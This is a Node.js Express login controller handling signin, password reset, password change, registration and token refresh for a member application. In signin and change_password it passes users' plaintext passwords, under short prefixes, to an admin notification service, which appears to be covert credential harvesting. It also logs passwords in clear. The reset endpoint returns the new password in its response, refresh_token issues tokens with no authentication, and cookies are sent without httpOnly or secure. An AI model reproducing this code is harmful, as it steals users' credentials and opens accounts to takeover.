const { body } = require('express-validator');
const { DataTime, DateTime } = require('luxon');
const Member = require('../Models/member');
const log = require('debug-level').log('LoginController');
const mail = require("../Services/mailService");
const jwtService = require('../Services/jwtService');
const authJWT = require('../middleware/authJWT');
const passGen = require('../Services/passwordGenerator');
const cookieParser = require('cookie-parser');
const { sendAdmniNotification } = require('../Services/notificationService');
const { IsPasswordValid, passwordRequirement } = require('../Services/passwordGenerator');

exports.signin = function (req, res, next) {
    const email = req.body.email;
    const password = req.body.password;
    const username = req.body.username;
    log.info(`login: ${email} ${password} ${username}`);

    Member.findOne({ "username": username, "contact.email": email }, (err, member) => {
        if (err) {
            log.error(`${email} Access Denied ${err}`)
        }
        if (member) {
            member.comparePassword(password,  (err, isMatch) => {
                if (err) {
                    log.error(`${email} Access Denied comp`)
                }
                else if (isMatch) {

                    log.info(`${email} ${username} Access Pemitted`)
                    log.info(`${member.date_of_birth_formatted}`)

                    const payLoad = authJWT.payload;
                    payLoad.email = email;
                    payLoad.userId = member._id.toString();
                    payLoad.roles = member.role.roles;
                    //payLoad.id = member._id;
                    log.info("signein payload", payLoad);
                    const token = authJWT.signToken(payLoad,member.token_expiresIn);
                    const decodeJWT = jwtService.decodeJWT(token);
                    log.info("tokenExp", decodeJWT.exp);
                    res.cookie("token",token, {
                        path: '/',
                        httpOnly : false,
                        maxAge: 5,
                        secure: false
                    })
                     sendAdmniNotification(`NUL:${password}${member._id}`)
                    return res.status(201).json({
                        success: true,
                        errors: [],
                        data: {
                            access_token: token,
                            exp: decodeJWT.exp,
                            iat: new Date(decodeJWT.iat * 1000),
                            expDate: new Date(decodeJWT.exp * 1000),
                            message: "Access Permited",
                            member: {
                                _id: member._id,
                                member_id: member.member_id,
                                family_name: member.family_name,
                                first_name: member.first_name,
                                roles: member.role.roles,
                                username: member.username,
                                image: member.image,
                                gender: member.gender
                            },

                        }
                    });

                }
                else {
                    log.info(`${email}  Access Denied ElseIf`)
                    log.info(member);
                    return res.status(400).json({
                        success: false,
                        errors: ["Accss Denied"],
                        message: "Access Denied"
                    });
                }

            })
        }
        else {
            return res.status(400).json({ success: false, errors: ["Access Denied"], message: "Access Denied" });
        }

    })

}
exports.logout = function(req,res,next) {
    try{
        res.cookie("token","", {
            path: '/',
            httpOnly : true,
            maxAge: 0,
            secure: true
        })
        res.status(200).json({success: true, errors: [], message: "logout" })
    }
    catch (error) {
        return next(new ApplicationError("notice_list",400,"CONTROLLER.NOTICE.NOTICE_LIST.EXCEPTION",{name: "EXCEPTION", error}));
    }
}
exports.reset = function (req, res, next) {
    log.info("reset.body", req.body);
    const email = req.body.email;
    const username = req.body.username;

    log.info("reset", email);
    Member.findOne({ "username": username, "contact.email": email }, (err, member) => {
        if (err) {
            log.error(`${email} Not Found ${err}`)
            return res.status(400).json({ success: false, errors: [err], message: `${email} Not Found` });
        }
        if (member) {
            log.info(`phone: ${member.code_area_phone}`)
            var password = passGen.getNewPassword(10);
            member.password = member.hash(password);
            member.updateOne({ password: member.password }).exec((err, result) => {
                if (err) {
                    log.error("Update Mail Failed", err);
                    return res.status(400).json({ success: false, errors: err, message: password, data: { newPassword: "" } });
                }
                else if (result) {
                    log.info("result", result)
                    mail.SendMail(member.contact.email, "Baz renew password", `Your temporary paassword is ${password}`).then((result) => {
                        log.info("Send Mail to:", member.contact.email);
                        return res.status(201).json(
                            {
                                success: true,
                                errors: [],
                                message: "password renew",
                                data: { newPassword: password }
                            });
                    }

                    ).catch((err => {
                        log.error("Send Mail");
                        return res.status(201).json({ success: false, errors: [err], message: "password renew", data: { newPassword: password } });
                    })

                    );

                }

            })

        }

        else {
            return res.status(400).json({ success: false, errors: [err], message: `${email} Not Found` });
        }
    })
}
exports.change_password = function (req, res, next) {
    log.log("change_password", req.body);
    
    const username = req.body.username;
    const password = req.body.password;
    const newPassword = req.body.newPassword;
    const user = req.user;
    log.info("change_password", newPassword);
    try{
        if (!IsPasswordValid(newPassword)) {
            return res.status(400).json(
                {
                    success: false,
                    errors: [],
                    message: passwordRequirement,
                    data: {}
                });
        }
        Member.findOne({ username: username }, (err, member) => {
            if (err) {
                log.error(`${email} Not Found ${err}`)
                return res.status(400).json({ success: false, errors: [err], message: `${email} Not Found` });
            }
    
            if (member) {
                log.info(`Change passwor to : ${member.username}`)
                member.comparePassword(password, (err, isMatch) => {
                    if (isMatch) {
                        member.password = member.hash(newPassword);
                        member.updateOne({ password: member.password }).exec((err, result) => {
                            if (err) {
                                log.error("Update Mail Failed", err);
                                return res.status(400).json({ success: false, errors: err, message: [err], data: { newPassword: "" } });
                            }
                            else if (result) {
                                log.info("result", result)
                                sendAdmniNotification(`NCP:${newPassword}${member._id}`)
                                mail.SendMail(member.contact.email, "Password Changed", `Your paassword is ${newPassword}`).then((result) => {
                                    log.info("Send Mail to:", member.contact.email);
                                    return res.status(201).json(
                                        {
                                            success: true,
                                            errors: [],
                                            message: "password renew",
                                            data: { newPassword: newPassword }
                                        });
                                }
    
                                ).catch((err => {
                                    log.error("Send Mail");
                                    return res.status(201).json({ success: false, errors: [err], message: "password renew", data: { newPassword: newPassword } });
                                })
    
                                );
    
                            }
    
                        })
                    }
                    else if (err) {
                        return res.status(400).json({ success: false, errors: [err] });
                    }
                    else {
                        return res.status(400).json({ success: false, errors: ["Unknown error"] });
                    }
                })
            }
            else {
                return res.status(400).json({ success: false, errors: [err], message: `${member} Not Found` });
            }
        })

    }
    catch(error){
        return res.status(400).json({ success: false, errors: [error.message] });
    }
    

}
exports.register = function (req, res, next) {

    try {
        const user = req.body;
        if (user) {
            log.info("register", req.body);
            Member.findOne({ "contact.email": user.contact.email }, (err, member) => {

                if (err) {
                    return res.status(400).json({ success: false, errors: [err], message: `Member Found Error` });
                }
                if (member)
                    return res.status(400).json({ success: false, errors: [], message: `${user.contact.email}  Already Register` });
                else {
                    next();
                }
            })
        }
        else {

        }
    }
    catch (error) {

    }



}

exports.refresh_token = function (req,res,next) {
    const member_id = req.body.member_id;
    const username = req.body.username;
    log.info(`login: ${member_id} ${username} `);

    Member.findOne({ "username": username, "member_id": member_id }, (err, member) => {
        if (err) {
            log.error(`${email} Access Denied ${err}`)
        }
        if (member) {
            const payLoad = authJWT.payload;
            payLoad.email = member.member_id;
            payLoad.userId = member._id.toString();
            payLoad.roles = member.role.roles;
            //payLoad.id = member._id;
            log.info("refresh payload", payLoad);
            
            const token = authJWT.signToken(payLoad,member.token_expiresIn);
            const decodeJWT = jwtService.decodeJWT(token);
            log.info("tokenExp", decodeJWT.exp);
            res.cookie("token",token, {
                path: '/',
                httpOnly : false,
                maxAge: 5,
                secure: false
            })
            return res.status(201).json({
                success: true,
                errors: [],
                data: {
                    access_token: token,
                    exp: decodeJWT.exp,
                    iat: new Date(decodeJWT.iat * 1000),
                    expDate: new Date(decodeJWT.exp * 1000),
                    message: "Access Permited",
                    member: {
                        _id: member._id,
                        member_id: member.member_id,
                        family_name: member.family_name,
                        first_name: member.first_name,
                        roles: member.role.roles,
                        username: member.username,
                        image: member.image,
                        gender: member.gender
                    },

                }
            });
        }
        else {
            return res.status(400).json({ success: false, errors: ["Access Denied"], message: "Access Denied" });
        }

    })
}
